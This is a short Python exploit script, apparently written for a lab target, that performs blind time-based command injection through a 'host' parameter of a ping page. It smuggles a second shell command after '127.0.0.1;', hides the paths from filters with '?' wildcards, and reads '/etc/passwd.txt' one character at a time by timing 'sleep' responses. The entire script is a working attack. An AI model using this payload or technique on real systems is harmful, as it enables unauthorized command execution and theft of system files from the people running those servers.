import requests
import sys

url = sys.argv[1]
#url = 'http://192.168.139.143/pinghw.php'
character = []
print(type(url))
print(url)
hash = 0

while hash < 21:
    hash = hash + 1
    dict = {'42': '*', '48': '0', '49': '1', '50': '2', '51': '3', '52': '4', '53': '5', '54': '6', '55': '7',
            '56': '8', '57': '9', '65': 'A', '66': 'B', '67': 'C', '68': 'D', '69': 'E', '70': 'F', '71': 'G',
            '72': 'H', '73': 'I', '74': 'J', '75': 'K', '76': 'L', '77': 'M', '78': 'N', '79': 'O', '80': 'P',
            '81': 'Q', '82': 'R', '83': 'S', '84': 'T', '85': 'U', '86': 'V', '87': 'W', '88': 'X', '89': 'Y',
            '90': 'Z'}
    print(hash)
    for key, value in dict.items():
        print(key, value)
        print(key)
        print(value)
        fname = "host"
        varriable2 = "?host=127.0.0.1; var=`/u?r/b?n/?at /e?c/pa??w??d.txt`; /u?r/b?n/e?p? substr $var {} 1 = {} && /u?r/b?n/s?e?p 1"
        myobj = {fname: varriable2.format(hash, value)}
        print(myobj)
        x = requests.get(url.encode('utf-8'), myobj)
        print(x)
        print(x.elapsed.total_seconds())
        if x.elapsed.total_seconds() > 1:
            character += value
print(character)
